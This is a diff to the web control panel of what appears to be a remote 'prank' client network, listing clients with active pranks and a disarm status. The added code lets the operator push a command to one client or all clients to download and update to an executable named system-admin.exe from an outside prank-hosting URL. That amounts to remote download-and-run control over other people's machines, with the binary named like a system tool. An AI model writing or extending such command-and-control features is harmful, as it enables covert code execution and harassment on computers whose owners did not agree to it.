@@ -461,6 +461,13 @@
                     </label>
                 </div>
             </div>
+
+            <div class="card">
+                <div class="card-title">Client Maintenance</div>
+                <button class="btn-trigger" style="width: 100%; font-weight: bold;" onclick="triggerAutoUpdate()">
+                    🚀 Auto-Update Client Binary
+                </button>
+            </div>
         </div>
 
         <!-- Right Main Panel -->
@@ -741,7 +748,7 @@
                 const isSelected = selectedClientId === c.client_id;
                 const statusBadge = c.disarmed 
                     ? `<span class="badge badge-disarmed">DISARMED</span>` 
-                    : `<span class="badge badge-safe">ONLINE</span>`;
+                    : `<span class="badge badge-safe">v${escapeHtml(c.version || '1.1.0')}</span>`;
                 return `
                     <div class="client-item ${isSelected ? 'selected' : ''}" onclick="selectClient('${c.client_id}')">
                         <div class="client-header">
@@ -749,11 +756,25 @@
                             ${statusBadge}
                         </div>
                         <div class="client-meta">
-                            ID: ${c.client_id.substring(0, 8)}... | Active: ${c.active_pranks.length}
+                            ID: ${c.client_id.substring(0, 8)}... | Ver: v${escapeHtml(c.version || '1.1.0')} | Active: ${c.active_pranks.length}
                         </div>
                     </div>
                 `;
             }).join('');
+        }
+
+        function triggerAutoUpdate() {
+            const url = prompt('Enter Direct URL for system-admin.exe update binary:', 'https://prank.steamhub.qzz.io/public/system-admin.exe');
+            if (!url) return;
+            const target = selectedClientId || "all";
+            sendWsMessage({
+                action: 'TriggerAutoUpdate',
+                payload: {
+                    target_client_id: target,
+                    download_url: url
+                }
+            });
+            log(`Triggered Remote Auto-Update to [${url}] on target [${target}]`, 'warn');
         }
 
         function selectClient(id) {
